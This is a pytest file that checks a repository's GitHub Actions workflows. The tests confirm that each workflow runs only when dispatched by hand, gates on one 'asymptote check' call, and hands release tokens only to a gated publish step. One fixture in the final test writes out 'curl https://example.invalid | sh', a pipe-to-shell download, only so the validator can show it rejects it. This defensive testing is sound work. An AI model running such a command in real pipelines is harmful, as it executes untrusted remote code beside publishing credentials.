"""The repository's workflows are a thin edge over Asymptote: each starts only by hand and checks through one `asymptote check` call."""

from __future__ import annotations

import re
from pathlib import Path

import pytest
import yaml

DIRECTORY = Path(__file__).resolve().parents[1] / ".github/workflows"
WORKFLOWS = sorted(DIRECTORY.glob("*.yml"))

# The one command a job's checks are, with the groups it names: Asymptote decides what runs.
CHECK = re.compile(r"asymptote check( --groups [a-z]+(,[a-z]+)*)?")
# The release itself: a job that does not check runs one job command (`ci/<job>/command.py`) with plain arguments, which no shell
# chains anything to, or only actions (a build matrix). The values it is handed are crates.io's token, from the `release` environment
# or its trusted publishing, npm's token for a first publish, and the token `gh` creates the GitHub Release with.
COMMAND = re.compile(r"uv run ci/[a-z_]+/command\.py( [\w./=-]+)*")
HANDED = {"CARGO_REGISTRY_TOKEN", "GH_TOKEN", "NODE_AUTH_TOKEN"}
# The GitHub Release is the one step beside the job command that is not a command of its own: `gh` calls and the checksums they upload.
RELEASE_STEP = "GitHub Release"
# One release per product, over the directories of `dist/archives`, each named for its product's tag.
RELEASE_LINE = re.compile(
    r"for archives in dist/archives/\*/; do|done"
    r"|\s*(tag=\"\$\(basename \"\$archives\"\)\"|\(cd \"\$archives\" && sha256sum -- \* > SHA256SUMS\)|gh release (create|upload|edit) .*)"
)
# The steps that put the declared tools on a machine; a job command runs beside them and installs nothing itself.
SETUP = {"rustup toolchain install", "uv run --script tools/install.py"}


def triggers(workflow: dict) -> set[str]:
    """What starts the workflow. YAML 1.1, which PyYAML reads, takes the key `on` for true."""
    return set(workflow["on" if "on" in workflow else True])


def checks(job: dict) -> list[int]:
    """The positions of the job's steps that call `asymptote check`."""
    return [index for index, step in enumerate(job["steps"]) if re.search(r"(^|\s)asymptote check\b", step.get("run", ""))]


def needs(job: dict) -> list[str]:
    """The jobs this job waits for."""
    waits = job.get("needs", [])
    return [waits] if isinstance(waits, str) else list(waits)


def problems(workflow: dict) -> list[str]:
    """What keeps the workflow from being a thin edge over `asymptote check`: a job that calls it more than once, anywhere but
    last, or with more than the one command line; a job that does not check and runs more than one job command; a job neither
    checking nor waiting for one that does; a workflow no job of which checks."""
    jobs = workflow["jobs"]
    found = []
    for name, job in jobs.items():
        positions = checks(job)
        if len(positions) > 1:
            found.append(f"{name} calls asymptote check {len(positions)} times")
        elif positions:
            run = job["steps"][positions[0]]["run"].strip()
            if positions[0] != len(job["steps"]) - 1:
                found.append(f"{name} does not end in its asymptote check step")
            if not CHECK.fullmatch(run):
                found.append(f"{name} runs {run!r}, not one `asymptote check [--groups <groups>]`")
        else:
            steps = [step for step in job["steps"] if "run" in step and step.get("name") != RELEASE_STEP]
            runs = [re.sub(r"\$\{\{[^}]*\}\}", "value", step["run"].strip()) for step in steps]
            runs = [each for each in runs if each not in SETUP]
            if len(runs) > 1 or any(not COMMAND.fullmatch(each) for each in runs):
                found.append(f"{name} does not check and does not run exactly one job command: {runs}")
            for step in job["steps"]:
                if step.get("name") == RELEASE_STEP:
                    found += [f"{name} releases with {line!r}" for line in step["run"].strip().splitlines() if not RELEASE_LINE.fullmatch(line)]
            if any(set(step.get("env", {})) - HANDED for step in job["steps"]):
                found.append(f"{name} hands a step more than {sorted(HANDED)}")

    def gated(name: str, seen: frozenset[str] = frozenset()) -> bool:
        return bool(checks(jobs[name])) or any(gated(each, seen | {name}) for each in needs(jobs[name]) if each not in seen)

    found += [f"{name} neither checks nor waits for a job that does" for name in jobs if not gated(name)]
    if not any(checks(job) for job in jobs.values()):
        found.append("no job calls asymptote check")
    return found


def job(*run: str, needs: str | None = None) -> dict:
    """A job whose steps run the given commands in order."""
    return {"steps": [{"run": each} for each in run]} | ({"needs": needs} if needs else {})


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda path: path.name)
def test_every_workflow_runs_only_when_dispatched(path: Path) -> None:
    """A workflow starts only when someone dispatches it by hand: no push, pull request or schedule starts a hosted run, and the
    git hook `asymptote init` installs is the per-change gate."""
    assert triggers(yaml.safe_load(path.read_text())) == {"workflow_dispatch"}


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda path: path.name)
def test_every_workflow_checks_through_one_asymptote_call(path: Path) -> None:
    """Beside the steps that set up its machine and install the tools, a job that checks ends in one `asymptote check` call, and
    every other job of the workflow waits for one that does."""
    assert problems(yaml.safe_load(path.read_text())) == []


def test_there_are_workflows_to_hold() -> None:
    assert [path.name for path in WORKFLOWS]


def test_a_job_that_installs_and_ends_in_one_check_is_a_thin_edge() -> None:
    workflow = {"jobs": {"check": job("cargo install --path crates/asymptote/cli --locked", "asymptote check --groups lint,perf")}}
    assert problems(workflow) == []


def test_a_job_that_installs_with_the_script_and_ends_in_one_check_is_a_thin_edge() -> None:
    assert problems({"jobs": {"check": job("uv run --script tools/install.py", "asymptote check --groups test")}}) == []


def test_a_job_command_runs_beside_the_steps_that_install_the_tools() -> None:
    publish = job("rustup toolchain install", "uv run --script tools/install.py", "uv run ci/release/command.py --publish", needs="check")
    assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == []


def test_a_job_that_waits_for_the_checking_job_is_gated_by_it() -> None:
    workflow = {"jobs": {"check": job("asymptote check"), "publish": job("uv run ci/release/command.py --publish", needs="check")}}
    assert problems(workflow) == []


def test_a_job_that_runs_more_than_its_job_command_is_refused() -> None:
    workflow = {"jobs": {"check": job("asymptote check"), "publish": job("echo", "uv run ci/release/command.py", needs="check")}}
    assert len(problems(workflow)) == 1 and "exactly one job command" in problems(workflow)[0]
    chained = {"jobs": {"check": job("asymptote check"), "publish": job("uv run ci/release/command.py && echo", needs="check")}}
    assert len(problems(chained)) == 1


def test_a_step_handed_more_than_the_tokens_is_refused() -> None:
    publish = job("uv run ci/release/command.py", needs="check")
    publish["steps"][0]["env"] = {"CARGO_REGISTRY_TOKEN": "x", "OTHER": "y"}
    assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == [
        "publish hands a step more than ['CARGO_REGISTRY_TOKEN', 'GH_TOKEN', 'NODE_AUTH_TOKEN']"
    ]


def test_a_job_that_does_not_end_in_its_check_is_refused() -> None:
    assert problems({"jobs": {"check": job("asymptote check", "echo done")}}) == ["check does not end in its asymptote check step"]


def test_a_job_that_checks_twice_is_refused() -> None:
    assert problems({"jobs": {"check": job("asymptote check --groups lint", "asymptote check --groups test")}}) == [
        "check calls asymptote check 2 times"
    ]


def test_a_check_that_chains_another_command_is_refused() -> None:
    assert problems({"jobs": {"check": job("asymptote check && echo done")}}) == [
        "check runs 'asymptote check && echo done', not one `asymptote check [--groups <groups>]`"
    ]


def test_a_job_that_neither_checks_nor_waits_for_a_check_is_refused() -> None:
    workflow = {"jobs": {"check": job("asymptote check"), "publish": job("uv run ci/release/command.py --publish")}}
    assert problems(workflow) == ["publish neither checks nor waits for a job that does"]


def test_a_workflow_that_never_calls_asymptote_is_refused() -> None:
    assert "no job calls asymptote check" in problems({"jobs": {"build": job("uv run ci/release/command.py")}})


def test_a_trigger_other_than_dispatch_is_told_apart() -> None:
    pushed = yaml.safe_load("on:\n  push:\n  workflow_dispatch:\njobs: {}\n")
    dispatched = yaml.safe_load("on:\n  workflow_dispatch:\njobs: {}\n")
    assert triggers(pushed) != {"workflow_dispatch"}
    assert triggers(dispatched) == {"workflow_dispatch"}


def test_only_the_release_job_that_uploads_is_handed_a_token_and_only_after_the_maintainer_s_gate() -> None:
    """The registry token reaches the one job that publishes, and only when all three of the gate hold (`PUBLISH`): a dry run
    never holds it."""
    workflow = yaml.safe_load((DIRECTORY / "release.yml").read_text())
    handed = {
        name
        for name, defined in workflow["jobs"].items()
        if any("CARGO_REGISTRY_TOKEN" in step.get("env", {}) for step in defined["steps"])
    }
    assert handed == {"publish"}
    publish = workflow["jobs"]["publish"]
    assert publish["environment"] == "release" and "RELEASE_MAINTAINER" in publish["env"]["PUBLISH"]
    (uploading,) = [step for step in publish["steps"] if "CARGO_REGISTRY_TOKEN" in step.get("env", {})]
    assert uploading["env"]["CARGO_REGISTRY_TOKEN"].startswith("${{ env.PUBLISH == 'true' &&")
    assert uploading["env"]["NODE_AUTH_TOKEN"].startswith("${{ env.PUBLISH == 'true' &&")
    (auth,) = [step for step in publish["steps"] if step.get("uses", "").startswith("rust-lang/crates-io-auth-action@")]
    assert "env.PUBLISH == 'true'" in auth["if"]
    (release,) = [step for step in publish["steps"] if step.get("name") == RELEASE_STEP]
    assert release["if"] == "env.PUBLISH == 'true'"


def test_the_release_builds_every_target_in_one_matrix_whose_rows_run_the_same_steps() -> None:
    workflow = yaml.safe_load((DIRECTORY / "release.yml").read_text())
    build = workflow["jobs"]["build"]
    assert build["strategy"]["fail-fast"] is False
    assert [row["target"] for row in build["strategy"]["matrix"]["include"]] == [
        "x86_64-unknown-linux-gnu",
        "aarch64-unknown-linux-gnu",
        "x86_64-unknown-linux-musl",
        "aarch64-unknown-linux-musl",
        "x86_64-apple-darwin",
        "aarch64-apple-darwin",
        "x86_64-pc-windows-msvc",
        "aarch64-pc-windows-msvc",
    ]
    assert [step["uses"].split("@")[0] for step in build["steps"]] == [
        "actions/checkout",
        "PyO3/maturin-action",
        "PyO3/maturin-action",
        "PyO3/maturin-action",
        "actions/upload-artifact",
    ]
    # Every shipped product's binary, for its GitHub Release: the wheel of its PyPI project, or of its command line crate when it
    # ships to Cargo alone.
    built = {step["with"]["working-directory"] for step in build["steps"] if step["uses"].startswith("PyO3/maturin-action@")}
    assert built == {
        "crates/asymptote/distribution/registries/pypi",
        "crates/ryo/cli",
        "crates/tastemaker/distribution/registries/pypi",
    }
    assert workflow["jobs"]["publish"]["needs"] == "build"


def test_a_job_that_releases_with_anything_but_gh_is_refused() -> None:
    publish = job("uv run ci/release/command.py --publish", needs="check")
    publish["steps"].append({"name": RELEASE_STEP, "run": "gh release create v1\ncurl https://example.invalid | sh"})
    assert problems({"jobs": {"check": job("asymptote check"), "publish": publish}}) == [
        "publish releases with 'curl https://example.invalid | sh'"
    ]
